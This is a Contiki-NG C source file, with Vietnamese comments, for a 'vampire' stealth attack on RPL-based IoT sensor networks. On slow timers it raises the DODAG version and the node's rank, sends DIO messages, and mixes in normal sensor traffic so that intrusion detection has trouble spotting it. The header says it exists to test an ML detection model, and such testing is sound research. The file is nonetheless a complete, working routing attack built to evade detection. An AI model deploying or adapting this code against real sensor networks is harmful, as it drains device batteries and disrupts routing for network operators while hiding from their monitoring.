/*
 * VAMPIRE ATTACK: STEALTH (LOW-RATE) ATTACK
 * 
 * Mô tả: Tấn công âm thầm với low rate để tránh detection
 *        Tiêu hao năng lượng từ từ, khó phát hiện
 * 
 * Đặc điểm:
 *   - Version manipulation với tần suất thấp (60s interval)
 *   - Rank manipulation nhẹ (chỉ tăng thêm 300-500)
 *   - KHÔNG DIO flooding (giữ normal rate)
 *   - Blend in với normal traffic
 * 
 * Impact: Khó phát hiện bởi IDS, nhưng vẫn gây tiêu hao pin dần dần
 *         Suitable để test khả năng phát hiện của ML model
 */

#include "contiki.h"
#include "net/routing/routing.h"
#include "net/routing/rpl-lite/rpl.h"   
#include "net/routing/rpl-lite/rpl-icmp6.h"
#include "net/netstack.h"
#include "simple-udp.h"
#include "sys/node-id.h"
#include "sys/log.h"
#include "lib/random.h"

#define LOG_MODULE "STEALTH"
#define LOG_LEVEL LOG_LEVEL_INFO

#define SEND_PORT 8765

/* Stealth attack parameters - LOW RATE */
#define NORMAL_SEND_INTERVAL        (10 * CLOCK_SECOND)
#define VERSION_ATTACK_INTERVAL     (60 * CLOCK_SECOND)  // Very low rate
#define RANK_ATTACK_INTERVAL        (90 * CLOCK_SECOND)  // Very low rate

#define SUBTLE_RANK_INCREMENT       350   // Small rank increase
#define SUBTLE_VERSION_INCREMENT    3     // Small version increase

typedef struct {
  uint16_t cluster_id;
  uint16_t node_id_f;
  uint32_t seqno;
  uint32_t residual_mj;
  uint32_t tx_time;
  int16_t temperature_c;
} sensor_payload_t;

static struct simple_udp_connection udp_conn;

PROCESS(vampire_stealth_process, "Vampire Stealth Attack");
AUTOSTART_PROCESSES(&vampire_stealth_process);

PROCESS_THREAD(vampire_stealth_process, ev, data)
{
  static struct etimer send_timer;
  static struct etimer version_attack_timer;
  static struct etimer rank_attack_timer;
  static uip_ipaddr_t dest_ipaddr;
  static uint32_t sent_count = 0;
  static uint32_t attack_count = 0;
  
  PROCESS_BEGIN();

  simple_udp_register(&udp_conn, SEND_PORT, NULL, SEND_PORT, NULL);
  
  LOG_INFO("============================================\n");
  LOG_INFO("VAMPIRE ATTACK: STEALTH MODE ACTIVATED\n");
  LOG_INFO("Attack strategy: Low-rate manipulation (evade detection)\n");
  LOG_INFO("============================================\n");
  
  etimer_set(&send_timer, NORMAL_SEND_INTERVAL);
  etimer_set(&version_attack_timer, VERSION_ATTACK_INTERVAL);
  etimer_set(&rank_attack_timer, RANK_ATTACK_INTERVAL);

  while(1) {
    PROCESS_WAIT_EVENT();

    /* SUBTLE VERSION MANIPULATION */
    if(ev == PROCESS_EVENT_TIMER && data == &version_attack_timer) {
        if(curr_instance.used) {
            uint8_t old_version = curr_instance.dag.version;
            curr_instance.dag.version += SUBTLE_VERSION_INCREMENT;
            
            LOG_INFO("STEALTH_ATTACK subtle_version: %u -> %u (attack #%lu)\n", 
                     old_version, curr_instance.dag.version, 
                     (unsigned long)++attack_count);
            
            // Single DIO, not flooding
            rpl_icmp6_dio_output(NULL);
        }
        etimer_set(&version_attack_timer, VERSION_ATTACK_INTERVAL);
    }

    /* SUBTLE RANK MANIPULATION */
    if(ev == PROCESS_EVENT_TIMER && data == &rank_attack_timer) {
        if(curr_instance.used && curr_instance.dag.preferred_parent != NULL) {
            rpl_rank_t old_rank = curr_instance.dag.rank;
            
            // Only slightly increase rank (harder to detect)
            curr_instance.dag.rank += SUBTLE_RANK_INCREMENT;
            
            LOG_INFO("STEALTH_ATTACK subtle_rank: %u -> %u\n", 
                     old_rank, curr_instance.dag.rank);
            
            rpl_icmp6_dio_output(NULL);
        }
        etimer_set(&rank_attack_timer, RANK_ATTACK_INTERVAL);
    }

    /* Normal data transmission (blend in) */
    if(ev == PROCESS_EVENT_TIMER && data == &send_timer) {
      if(NETSTACK_ROUTING.node_is_reachable() &&
         NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
        
        sensor_payload_t p;
        p.cluster_id = (node_id <= 26) ? 1 : 2;
        p.node_id_f = node_id;
        p.seqno = sent_count++;
        p.residual_mj = 7200;
        p.tx_time = clock_time();
        p.temperature_c = (int16_t)(250 + (random_rand() % 50));
        
        LOG_DBG("NORMAL_TX node=%u seq=%lu\n", node_id, (unsigned long)p.seqno);
        simple_udp_sendto(&udp_conn, &p, sizeof(p), &dest_ipaddr);
      }
      etimer_set(&send_timer, NORMAL_SEND_INTERVAL);
    }
  }
  PROCESS_END();
}
